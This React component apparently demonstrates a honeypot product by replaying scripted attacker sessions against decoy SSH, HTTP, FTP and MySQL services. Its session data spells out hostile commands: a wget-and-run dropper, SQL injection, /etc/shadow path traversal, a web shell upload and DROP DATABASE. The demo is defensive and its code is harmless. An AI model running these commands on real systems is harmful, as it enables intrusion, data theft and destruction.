import React, { useEffect, useRef, useState } from 'react';
import { HONEYPOTS } from './attackTypes';

const SESSIONS = {
  SSH: [
    { from: 'atk', text: 'ssh root@203.0.113.7' },
    { from: 'trap', text: "root@203.0.113.7's password:" },
    { from: 'atk', text: '••••', capture: { label: 'Credential', value: 'root / toor' } },
    { from: 'trap', text: 'Welcome to Ubuntu 20.04.6 LTS', tarpit: 2.5 },
    { from: 'atk', text: 'uname -a', capture: { label: 'Recon command', value: 'uname -a' } },
    { from: 'trap', text: 'Linux web-prod-02 5.4.0-150-generic x86_64' },
    { from: 'atk', text: 'cd /tmp && wget http://198.51.100.23/x.sh', capture: { label: 'Dropper URL', value: '198.51.100.23/x.sh' } },
    { from: 'trap', text: 'Connecting to 198.51.100.23:80…', tarpit: 6 },
    { from: 'atk', text: 'chmod +x x.sh && ./x.sh', capture: { label: 'Execution attempt', value: './x.sh' } },
    { from: 'trap', text: 'bash: ./x.sh: Permission denied' },
  ],
  HTTP: [
    { from: 'atk', text: 'GET /wp-login.php HTTP/1.1' },
    { from: 'trap', text: '200 OK — decoy WordPress login' },
    { from: 'atk', text: 'POST /wp-login.php  log=admin&pwd=admin', capture: { label: 'Credential', value: 'admin / admin' } },
    { from: 'trap', text: '302 Found → /wp-admin/', tarpit: 2 },
    { from: 'atk', text: "GET /wp-admin/?id=1' UNION SELECT user_pass FROM wp_users--", capture: { label: 'SQL injection', value: 'UNION SELECT user_pass' } },
    { from: 'trap', text: '200 OK — fabricated hash table', tarpit: 3.5 },
    { from: 'atk', text: 'GET /../../../../etc/shadow', capture: { label: 'Path traversal', value: '/etc/shadow' } },
    { from: 'trap', text: '403 Forbidden' },
  ],
  FTP: [
    { from: 'atk', text: 'USER anonymous' },
    { from: 'trap', text: '331 Guest login ok, send email as password' },
    { from: 'atk', text: 'PASS guest@', capture: { label: 'Credential', value: 'anonymous / guest@' } },
    { from: 'trap', text: '230 Login successful', tarpit: 1.5 },
    { from: 'atk', text: 'LIST' },
    { from: 'trap', text: '-rw-r--r--  backup_2024.sql.gz  (decoy)' },
    { from: 'atk', text: 'RETR backup_2024.sql.gz', capture: { label: 'Exfil attempt', value: 'backup_2024.sql.gz' } },
    { from: 'trap', text: '150 Opening data connection… 2 KB/s', tarpit: 8 },
    { from: 'atk', text: 'STOR shell.php', capture: { label: 'Upload attempt', value: 'shell.php' } },
    { from: 'trap', text: '553 Could not create file' },
  ],
  MySQL: [
    { from: 'atk', text: 'mysql -h 203.0.113.7 -u root -p' },
    { from: 'trap', text: 'Enter password:' },
    { from: 'atk', text: '(empty)', capture: { label: 'Credential', value: 'root / <empty>' } },
    { from: 'trap', text: 'Server version: 5.7.31 MySQL Community Server', tarpit: 2 },
    { from: 'atk', text: 'SHOW DATABASES;', capture: { label: 'Recon query', value: 'SHOW DATABASES' } },
    { from: 'trap', text: 'customers | payments | sys' },
    { from: 'atk', text: 'SELECT * FROM payments.cards LIMIT 10;', capture: { label: 'Data grab', value: 'payments.cards' } },
    { from: 'trap', text: '10 rows in set (fabricated)', tarpit: 4 },
    { from: 'atk', text: 'DROP DATABASE customers;', capture: { label: 'Destructive query', value: 'DROP DATABASE' } },
    { from: 'trap', text: "ERROR 1044: Access denied for user 'root'" },
  ],
};

const formatClock = (s) => {
  const m = Math.floor(s / 60);
  return `${String(m).padStart(2, '0')}:${(s - m * 60).toFixed(1).padStart(4, '0')}`;
};

export default function TrapReplay() {
  const [tab, setTab] = useState(0);
  const [step, setStep] = useState(0);
  const [visible, setVisible] = useState(false);
  const rootRef = useRef(null);

  const pot = HONEYPOTS[tab];
  const lines = SESSIONS[pot.name];
  const done = step >= lines.length;

  useEffect(() => {
    const el = rootRef.current;
    if (!el) return undefined;
    const io = new IntersectionObserver(([entry]) => setVisible(entry.isIntersecting), { threshold: 0.35 });
    io.observe(el);
    return () => io.disconnect();
  }, []);

  useEffect(() => {
    if (!visible || done) return undefined;
    const next = lines[step];
    const delay = next.from === 'atk' ? 650 + next.text.length * 14 : 380 + (next.tarpit || 0) * 260;
    const id = window.setTimeout(() => setStep((s) => s + 1), delay);
    return () => window.clearTimeout(id);
  }, [visible, done, step, lines]);

  const shown = lines.slice(0, step);
  const captures = shown.filter((l) => l.capture);
  const wasted = shown.reduce((acc, l) => acc + (l.tarpit || 0), 0) + shown.length * 0.6;
  const pending = !done && lines[step];

  return (
    <div ref={rootRef} className="sx-box">
      <div role="tablist" aria-label="Choose a trap to replay" className="sx-replay-tabs">
        {HONEYPOTS.map((p, i) => (
          <button key={p.id} role="tab" type="button" aria-selected={tab === i} onClick={() => { setTab(i); setStep(0); }}>
            <span>{p.id}</span>
            <b className="sx-serif">{p.name}</b>
          </button>
        ))}
      </div>

      <div role="tabpanel" aria-label={`${pot.name} session replay`} className="sx-replay">
        <div className="sx-replay-term">
          <div className="sx-replay-bar">
            <span>{`Attacker's view — ${pot.name.toLowerCase()} :${pot.port}`}</span>
            <span className="sx-replay-state">
              <span className={`sx-sq${done ? '' : ' sx-blink'}`} aria-hidden="true" />
              {done ? 'Session closed' : 'Replaying'}
            </span>
          </div>
          <ol aria-live="polite">
            {shown.map((l, i) => (
              <li key={`${tab}-${i}`}>
                <span className={l.from === 'atk' ? 'is-atk' : 'is-trap'}>{l.from === 'atk' ? 'atk$' : 'trap'}</span>
                <span className={l.from === 'atk' ? '' : 'is-trap-text'}>
                  {l.text}
                  {l.tarpit ? <span className="sx-tag">{`tarpit +${l.tarpit.toFixed(1)}s`}</span> : null}
                </span>
              </li>
            ))}
            {pending && (
              <li aria-hidden="true">
                <span className={pending.from === 'atk' ? 'is-atk' : 'is-trap'}>{pending.from === 'atk' ? 'atk$' : 'trap'}</span>
                <span>
                  {pending.tarpit ? <span className="is-trap">{'stalling… '}</span> : null}
                  <span className="sx-cursor sx-blink" />
                </span>
              </li>
            )}
          </ol>
        </div>

        <aside aria-label="What Snaptrap recorded" className="sx-replay-notes">
          <div className="sx-notes-head">
            <p className="sx-label">Our notes</p>
            <p className="sx-serif">{`${captures.length} artefacts logged`}</p>
          </div>
          <ol className="sx-notes-list">
            {captures.map((l, i) => (
              <li key={`${tab}-c-${i}`}>
                <span className="sx-signal">{String(i + 1).padStart(2, '0')}</span>
                <span>
                  <span className="sx-label">{l.capture.label}</span>
                  <span className="sx-trunc sx-block">{l.capture.value}</span>
                </span>
              </li>
            ))}
            {captures.length === 0 && <li className="sx-dim sx-listening">Listening…</li>}
          </ol>
          <div className="sx-notes-foot">
            <div>
              <p className="sx-label">Attacker time wasted</p>
              <p className="sx-serif sx-signal sx-wasted">{formatClock(wasted)}</p>
            </div>
            <button type="button" onClick={() => setStep(0)} className="sx-mini">↺ Replay</button>
          </div>
        </aside>
      </div>
    </div>
  );
}